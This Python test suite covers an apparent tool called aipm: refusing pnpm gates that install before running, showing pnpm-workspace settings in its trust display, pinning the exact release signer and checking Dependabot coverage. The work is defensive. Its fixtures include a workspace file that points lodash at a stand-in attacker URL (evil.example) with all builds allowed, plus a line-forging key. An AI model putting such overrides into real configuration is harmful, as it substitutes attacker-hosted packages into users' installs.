"""The v0.4 decisions, session 4: the low findings left open at the end of session 3.

1. A pnpm gate and a committed `verifyDepsBeforeRun: install`.
2. `cacheDir`, `virtualStoreDir` and `modulesDir` in `pnpm-workspace.yaml`.
3. `aipm trust --show` lists `pnpm-workspace.yaml`'s settings.
4. Release verification pins the signer certificate exactly (`--cert-identity`).
5. Dependabot covers every locked dependency set under `.github/`.
"""

import json
import os
import sys
from pathlib import Path

import pytest
from ruamel.yaml import YAML

from aipm.domain.errors import ExitCode, PolicyViolation
from aipm.domain.models import GateStatus
from aipm.execution.package_cache import pnpm_env
from aipm.execution.worktree import WorktreeManager
from aipm.gates.command_gate import (
    refuse_pnpm_install_before_run,
    run_command_gate,
    run_prepare,
)
from aipm.state.pnpm_workspace import installs_before_run, load_settings, read_settings
from aipm.state.trust_store import pin_toolchain, render_surface
from tests.conftest import REPO_ROOT
from tests.integration.conftest import (
    UserDirs,
    user_dirs,  # noqa: F401 - an autouse fixture
)
from tests.integration.flow import aipm, ok, trust
from tests.security.test_v04_decisions_2 import (
    committed,
    dirs,  # noqa: F401 - the fixture
    surface_of,
)
from tests.security.test_v04_decisions_3 import pnpm_ctx

# ---------------------------------------------------------------- 5: Dependabot

LOCKFILE_ECOSYSTEMS = {
    "package-lock.json": "npm",
    "uv.lock": "uv",
    "requirements-build.txt": "pip",
}
"""A locked or hash-pinned dependency file under `.github/`, and the ecosystem that updates it."""


def _dependabot_entries() -> set[tuple[str, str]]:
    doc = YAML(typ="safe", pure=True).load((REPO_ROOT / ".github" / "dependabot.yml").read_text())
    return {(u["package-ecosystem"], u["directory"].rstrip("/") or "/") for u in doc["updates"]}


def test_every_locked_dependency_set_under_github_has_a_dependabot_entry() -> None:
    """The sandbox job's `package-lock.json` (srt, pnpm) had none, so it got no updates."""
    entries = _dependabot_entries()
    found = [
        path
        for path in sorted((REPO_ROOT / ".github").rglob("*"))
        if path.name in LOCKFILE_ECOSYSTEMS and "node_modules" not in path.parts
    ]
    assert found, "no lockfile found under .github/"
    for path in found:
        directory = "/" + str(path.parent.relative_to(REPO_ROOT))
        assert (LOCKFILE_ECOSYSTEMS[path.name], directory) in entries, path


def test_every_dependabot_entry_waits_a_week() -> None:
    doc = YAML(typ="safe", pure=True).load((REPO_ROOT / ".github" / "dependabot.yml").read_text())
    for update in doc["updates"]:
        assert update["cooldown"]["default-days"] >= 7, update["directory"]
        assert update["commit-message"]["prefix"] == "chore", update["directory"]


def test_the_root_lockfile_stays_covered() -> None:
    assert ("uv", "/") in _dependabot_entries()
    assert Path(REPO_ROOT / "uv.lock").is_file()


# ---------------------------------------------------------------- 4: exact signer identity

SIGNER = "https://github.com/mlbala/aipm/.github/workflows/release.yml@refs/tags/"


def test_install_sh_and_the_readme_pin_the_exact_signer_identity() -> None:
    """`--signer-workflow` may match more than one workflow path; `--cert-identity` is exact,
    and gh refuses the two together, so neither command may name `--signer-workflow`."""
    install = (REPO_ROOT / "install.sh").read_text(encoding="utf-8")
    readme = (REPO_ROOT / "README.md").read_text(encoding="utf-8")
    assert f'--cert-identity "{SIGNER}$TAG"' in install
    assert f"--cert-identity {SIGNER}v" in readme
    for text in (install, readme):
        assert "--signer-workflow mlbala" not in text
        assert "--cert-identity-regex" not in text


# ---------------------------------------------------------------- 3: trust --show lists settings

WORKSPACE = """\
packages:
  - apps/*
catalog:
  react: ^19.0.0
dangerouslyAllowAllBuilds: true
overrides:
  lodash: https://evil.example/lodash.tgz
linkWorkspacePackages: true
"""


def _pinned(text: str) -> dict[str, str]:
    return pin_toolchain({"pnpm-workspace.yaml": ("100644", text.encode())})["pnpm-workspace.yaml"]


def test_the_surface_holds_the_settings_but_not_the_package_lists() -> None:
    entry = _pinned(WORKSPACE)
    settings = json.loads(entry["settings"])
    assert set(settings) == {"dangerouslyAllowAllBuilds", "overrides", "linkWorkspacePackages"}
    assert settings["overrides"] == {"lodash": "https://evil.example/lodash.tgz"}
    assert len(entry["sha256"]) == 64


def test_trust_show_lists_each_setting_and_marks_the_risky_ones() -> None:
    surface = {"toolchain_files": {"pnpm-workspace.yaml": _pinned(WORKSPACE)}}
    lines = [line for line in _toolchain_part(surface) if line.startswith("    ")]
    risky = "[changes what pnpm installs or runs, or where it writes]"
    assert lines == [
        f"    dangerouslyAllowAllBuilds: true  {risky}",
        f'    overrides: {{"lodash": "https://evil.example/lodash.tgz"}}  {risky}',
        "    linkWorkspacePackages: true",
    ]  # the risky ones first


def test_a_long_value_is_cut() -> None:
    surface = {"toolchain_files": {"pnpm-workspace.yaml": _pinned(f"registry: {'x' * 500}\n")}}
    (line,) = [line for line in _toolchain_part(surface) if line.startswith("    registry")]
    assert len(line) < 260 and "~" in line


@pytest.mark.parametrize(
    "text", ["- a list\n", "key: [unclosed\n", "a: &x 1\nb: *x\n"], ids=["list", "bad", "alias"]
)
def test_settings_aipm_cannot_read_are_named_not_hidden(text: str) -> None:
    entry = _pinned(text)
    assert "settings" not in entry and entry["error"]
    surface = {"toolchain_files": {"pnpm-workspace.yaml": entry}}
    assert any("settings not shown" in line for line in _toolchain_part(surface))


def test_a_changed_setting_asks_for_trust_again(tmp_repo: Path) -> None:
    committed(tmp_repo, "pnpm-workspace.yaml", "verifyDepsBeforeRun: error\n")
    first = surface_of(tmp_repo)
    committed(tmp_repo, "pnpm-workspace.yaml", "verifyDepsBeforeRun: install\n")
    second = surface_of(tmp_repo)
    assert first != second


def test_trust_show_prints_the_settings_end_to_end(tmp_repo: Path, dirs: UserDirs) -> None:  # noqa: F811
    del dirs
    ok(aipm(tmp_repo, "init"))
    trust(tmp_repo)
    committed(tmp_repo, "pnpm-workspace.yaml", "dangerouslyAllowAllBuilds: true\n")
    out = ok(aipm(tmp_repo, "trust", "--show")).stdout
    assert "dangerouslyAllowAllBuilds: true" in out
    assert "changes what pnpm installs or runs" in out


def _toolchain_part(surface: dict[str, object]) -> list[str]:
    """`render_surface`'s toolchain lines, for a surface with nothing else in it."""
    base: dict[str, object] = {
        "prepare": None, "gates": {}, "scanners_extra": {}, "relaxations": [],
        "dispatch": {"enabled": False, "default_tool": "claude", "sandbox": "auto", "tools": {}},
        "require_sandbox": False, "network": {"agent": "a", "gates": "g", "prepare": "p"},
    }  # fmt: skip
    for key in ("allowed_executables", "extra_allowed_executables"):
        base[key] = []
    lines = render_surface({**base, **surface}, "0" * 64)
    start = lines.index("repository toolchain files (hashed; a change asks for trust again):")
    return lines[start:]


# ---------------------------------------------------------------- 1: pnpm installing in a gate


@pytest.mark.parametrize(
    ("text", "installs"),
    [
        ("verifyDepsBeforeRun: install\n", True),
        ("verifyDepsBeforeRun: prompt\n", True),
        ("verifyDepsBeforeRun: true\n", True),
        ("verifyDepsBeforeRun: something-new\n", True),
        ("verify-deps-before-run: install\n", True),
        ("verifyDepsBeforeRun: error\n", False),
        ("verifyDepsBeforeRun: warn\n", False),
        ("verifyDepsBeforeRun: false\n", False),
        ("linkWorkspacePackages: true\n", False),
        ("", False),
    ],
)
def test_which_values_install_before_a_script(text: str, installs: bool) -> None:
    """Only `error`, `warn` and `false` never install; a value pnpm adds later is refused."""
    assert installs_before_run(load_settings(text.encode())) is installs


def test_pnpm_is_pinned_to_the_worktree_and_told_to_fail_rather_than_install(
    tmp_path: Path,
) -> None:
    """Checked by hand on pnpm 10.34.9: `npm_config_…` beats `.npmrc`, `pnpm_config_…` beats
    `pnpm-workspace.yaml` (a `${VAR:-verifyDepsBeforeRun}` key too), and the workspace dir stops
    pnpm reading a `pnpm-workspace.yaml` above the worktree."""
    assert pnpm_env("/opt/bin/pnpm", tmp_path) == {
        "NPM_CONFIG_WORKSPACE_DIR": str(tmp_path),
        "npm_config_verify_deps_before_run": "error",
        "pnpm_config_verify_deps_before_run": "error",
    }
    for other in ("npm", "uv", "go", "/usr/bin/python3", "pnpx"):
        assert pnpm_env(other, tmp_path) == {}


@pytest.mark.parametrize(
    "key", ["${AIPM_NOPE:-verifyDepsBeforeRun}", "${HOME}", "verify${X}DepsBeforeRun"]
)
def test_a_key_pnpm_expands_is_treated_as_installing(key: str) -> None:
    """pnpm expands `${VAR:-default}` in keys, so aipm cannot tell which setting one names."""
    settings = load_settings(f'"{key}": install\n'.encode())
    assert installs_before_run(settings)
    surface = {"toolchain_files": {"pnpm-workspace.yaml": _pinned(f'"{key}": x\n')}}
    assert any("changes what pnpm" in line for line in _toolchain_part(surface))


@pytest.mark.parametrize(
    "name", ["pnpm-workspace.yaml", "PNPM-Workspace.yaml", "pnpm-workspace.yml",
             "pnpm-workspaces.yaml"],
)  # fmt: skip
def test_a_pnpm_workspace_file_above_the_worktrees_is_refused(tmp_repo: Path, name: str) -> None:
    """pnpm searches every directory above its working directory for the file (the review of
    session 4); without srt a process could plant one there for every later task."""
    manager = WorktreeManager(tmp_repo)
    manager.root.mkdir(parents=True, exist_ok=True)
    (manager.root / name).write_text("verifyDepsBeforeRun: install\n", encoding="utf-8")
    with pytest.raises(PolicyViolation, match="pnpm's"):
        manager.check_parents()


def test_a_pnpm_gate_is_refused_when_the_workspace_file_installs(tmp_path: Path) -> None:
    """The file beats the variable (checked by hand on pnpm 10.34.9: `pnpm test` ran
    `pnpm install`), so the gate never starts."""
    root = tmp_path / "repo"
    root.mkdir()
    (root / "pnpm-workspace.yaml").write_text("verifyDepsBeforeRun: install\n", encoding="utf-8")
    with pytest.raises(PolicyViolation, match="verifyDepsBeforeRun") as info:
        refuse_pnpm_install_before_run("/opt/bin/pnpm", root)
    assert info.value.exit_code is ExitCode.SECURITY_VIOLATION
    refuse_pnpm_install_before_run("/usr/bin/npm", root)  # not pnpm: not its setting


def test_a_pnpm_gate_runs_with_a_safe_or_no_workspace_file(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    root.mkdir()
    refuse_pnpm_install_before_run("/opt/bin/pnpm", root)
    (root / "pnpm-workspace.yaml").write_text("verifyDepsBeforeRun: error\n", encoding="utf-8")
    refuse_pnpm_install_before_run("/opt/bin/pnpm", root)


@pytest.mark.parametrize("kind", ["link", "directory", "unparsable", "too-big"])
def test_a_workspace_file_aipm_cannot_check_refuses_the_pnpm_gate(
    tmp_path: Path, kind: str
) -> None:
    """pnpm would still read it, so the check fails closed."""
    root = tmp_path / "repo"
    root.mkdir()
    target = root / "pnpm-workspace.yaml"
    if kind == "link":
        (tmp_path / "real.yaml").write_text("verifyDepsBeforeRun: error\n", encoding="utf-8")
        target.symlink_to(tmp_path / "real.yaml")
    elif kind == "directory":
        target.mkdir()
    elif kind == "unparsable":
        target.write_text("key: [unclosed\n", encoding="utf-8")
    else:
        target.write_text("#" * (1_048_576 + 1), encoding="utf-8")
    with pytest.raises(PolicyViolation, match="cannot be checked"):
        refuse_pnpm_install_before_run("/opt/bin/pnpm", root)
    with pytest.raises(PolicyViolation, match="cannot be checked"):
        read_settings(root)


def test_a_workspace_file_aipm_cannot_open_or_decode_refuses_the_pnpm_gate(tmp_path: Path) -> None:
    root = tmp_path / "repo"
    root.mkdir()
    target = root / "pnpm-workspace.yaml"
    target.write_bytes(b"verifyDepsBeforeRun: \xff\n")
    with pytest.raises(PolicyViolation, match="not UTF-8"):
        refuse_pnpm_install_before_run("/opt/bin/pnpm", root)
    target.write_text("verifyDepsBeforeRun: error\n", encoding="utf-8")
    target.chmod(0o000)
    try:
        if os.access(target, os.R_OK):
            pytest.skip("running as a user who can read a mode-000 file")
        with pytest.raises(PolicyViolation, match="cannot be checked"):
            refuse_pnpm_install_before_run("/opt/bin/pnpm", root)
    finally:
        target.chmod(0o644)


ENV_RECORDER = """#!{python}
import os, sys
with open({log!r}, "a") as out:
    for name in ("NPM_CONFIG_WORKSPACE_DIR", "npm_config_verify_deps_before_run",
                 "pnpm_config_verify_deps_before_run"):
        out.write(os.environ.get(name, "unset") + "\\n")
"""


def _env_pnpm(tmp_path: Path) -> tuple[str, Path]:
    log = tmp_path / "env.log"
    bin_dir = tmp_path / "pnpm-bin"
    bin_dir.mkdir()
    program = bin_dir / "pnpm"
    program.write_text(ENV_RECORDER.format(python=sys.executable, log=str(log)), encoding="utf-8")
    program.chmod(0o755)
    return str(program), log


def test_a_pnpm_gate_runs_with_the_variable_set(tmp_path: Path) -> None:
    program, log = _env_pnpm(tmp_path)
    ctx = pnpm_ctx(tmp_path, program, gate_run=(program, "test"))
    outcome = run_command_gate("unit", ctx.cfg.gates["unit"], ctx, paths=[], required=True)
    assert outcome.result.status is GateStatus.PASS, outcome.result.summary
    assert log.read_text(encoding="utf-8").splitlines() == [str(ctx.root), "error", "error"]


def test_a_pnpm_gate_with_an_installing_workspace_file_never_starts(tmp_path: Path) -> None:
    program, log = _env_pnpm(tmp_path)
    ctx = pnpm_ctx(tmp_path, program, gate_run=(program, "test"))
    (ctx.root / "pnpm-workspace.yaml").write_text(
        "verifyDepsBeforeRun: install\n", encoding="utf-8"
    )
    with pytest.raises(PolicyViolation, match="verifyDepsBeforeRun"):
        run_command_gate("unit", ctx.cfg.gates["unit"], ctx, paths=[], required=True)
    assert not log.exists()


def test_an_unreadable_settings_entry_is_named_not_shown() -> None:
    entry = {"sha256": "0" * 64, "settings": "{not json"}
    surface = {"toolchain_files": {"pnpm-workspace.yaml": entry}}
    assert "    settings not shown (unreadable); review the file before trusting it" in (
        _toolchain_part(surface)
    )


def test_a_pnpm_prepare_is_pinned_to_the_worktree(tmp_path: Path) -> None:
    """A parent `pnpm-workspace.yaml` could also set prepare's registry or pnpmfile."""
    program, log = _env_pnpm(tmp_path)
    ctx = pnpm_ctx(tmp_path, program)
    outcome = run_prepare(ctx)
    assert outcome is not None and outcome.result.status is GateStatus.PASS, outcome
    assert log.read_text(encoding="utf-8").splitlines()[0] == str(ctx.root)


def test_a_fifo_in_place_of_the_workspace_file_does_not_hang_the_check(tmp_path: Path) -> None:
    """Code run by an earlier gate could `mkfifo` it; an open without O_NONBLOCK would wait for
    a writer forever."""
    root = tmp_path / "repo"
    root.mkdir()
    os.mkfifo(root / "pnpm-workspace.yaml")
    with pytest.raises(PolicyViolation, match="not a regular file"):
        refuse_pnpm_install_before_run("/opt/bin/pnpm", root)


def test_a_key_cannot_forge_lines_in_trust_show() -> None:
    key = "x\n  .npmrc [sha256 " + "0" * 64 + "]\n    registry: https://ok.example/"
    surface = {"toolchain_files": {"pnpm-workspace.yaml": _pinned(f"{json.dumps(key)}: 1\n")}}
    lines = _toolchain_part(surface)
    assert not any(line.startswith("  .npmrc") for line in lines)
    assert all("\n" not in line for line in lines)
    long_key = {"toolchain_files": {"pnpm-workspace.yaml": _pinned(f"{'k' * 5000}: 1\n")}}
    assert all(len(line) < 400 for line in _toolchain_part(long_key))


def test_many_settings_are_capped_with_the_risky_ones_first() -> None:
    text = "".join(f"setting{n:03}: 1\n" for n in range(100)) + "overrides: {a: b}\n"
    surface = {"toolchain_files": {"pnpm-workspace.yaml": _pinned(text)}}
    shown = [line for line in _toolchain_part(surface) if line.startswith("    ")]
    assert shown[0].startswith("    overrides:")
    assert len(shown) == 41 and shown[-1] == "    ... and 61 more settings: review the file"
